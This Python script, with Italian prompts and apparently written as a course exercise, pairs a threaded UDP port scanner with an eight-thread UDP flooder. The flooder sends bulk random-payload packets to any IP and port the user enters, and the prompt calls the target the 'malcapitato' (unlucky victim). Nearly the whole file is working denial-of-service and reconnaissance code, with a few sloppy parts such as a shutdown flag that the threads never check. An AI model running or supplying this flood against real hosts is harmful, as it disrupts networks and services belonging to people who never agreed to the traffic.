import socket
import threading
import random

shutdown_event = threading.Event()

def send_udp_packets(SRV_ADDR, SRV_PORT, NPACK):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(NPACK):
        data = bytearray(random.getrandbits(8) for _ in range(1024))
        s.sendto(data, (SRV_ADDR, SRV_PORT))
        print(f"Il pacchetto {i+1} viene inviato da {threading.current_thread().name}")
    s.close()
    print(f"{threading.current_thread().name} Terminato.")

def port_scan_range(target, lowport, highport, results):
    for port in range(lowport, highport + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.sendto(b'', (target, port))
            data, _ = s.recvfrom(1024)
            results[port] = "APERTA"

        except socket.timeout:
            results[port] = "CHIUSA o non risponde"

        except socket.error as e:
            results[port] = f"Errore: {e}"

        finally:
            s.close()

def port_scanner(target, port_range):
    results = {}
    threads = []
    for lowport, highport in port_range:
        thread = threading.Thread(target=port_scan_range, args=(target, lowport, highport, results))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    # Stampiamo i risultati in ordine numerico di porta
    for port, status in sorted(results.items()):
        print(f"Porta {port} su {target} Ã¨ {status}")

def main():
    print("\033[92m"
      " ____   __   __  _____   _____     ____    _____   ____    _____   _       ____  \n"
      "| __ )  \ \ / / |_   _| | ____|   |  _ \  | ____| | __ )  | ____| | |     / ___| \n"
      "|  _ \   \ V /    | |   |  _|     | |_) | |  _|   |  _ \  |  _|   | |     \___ \ \n"
      "| |_) |   | |     | |   | |___    |  _ <  | |___  | |_) | | |___  | |___   ___) |\n"
      "|____/    |_|     |_|   |_____|   |_| \_\ |_____| |____/  |_____| |_____| |____/ \n"
      "L'esercizio di oggi consiste nel scrivere un programma in Python che simuli un\n"
      "flood UDP, ovvero l'invio massivo di richieste UDP verso una macchina target\n"
      "che è in ascolto su una porta UDP casuale."
      "\033[0m"
    )

    target_ip = input("Inserisci l'indirizzo IP del malcapitato da scansire: ")
    port_range_str = input("Inserisci il port range da scansire (es: 1-100,201-300): ")
    port_ranges = [map(int, port_range.split('-')) for port_range in port_range_str.split(',')]
    
    port_scanner(target_ip, port_ranges)

    SRV_ADDR = input("Inserisci indirizzo: ")
    SRV_PORT = int(input("Inserisci numero di porta: "))
    NPACK = int(input("Inserisci numero pacchetti che si vuole inviare: "))
    NUM_THREADS = 8
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=send_udp_packets, args=(SRV_ADDR, SRV_PORT, NPACK), name=f"Thread-{i+1}")
        threads.append(thread)
        thread.start()
    
    print(f"{NUM_THREADS} thread avviati per l'invio di pacchetti UDP.")

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Ricevuta interruzione da tastiera. Terminazione dei thread...")
        shutdown_event.set() 

    for thread in threads:
        thread.join() 

    print("Programma terminato.")

if __name__ == "__main__":
    main()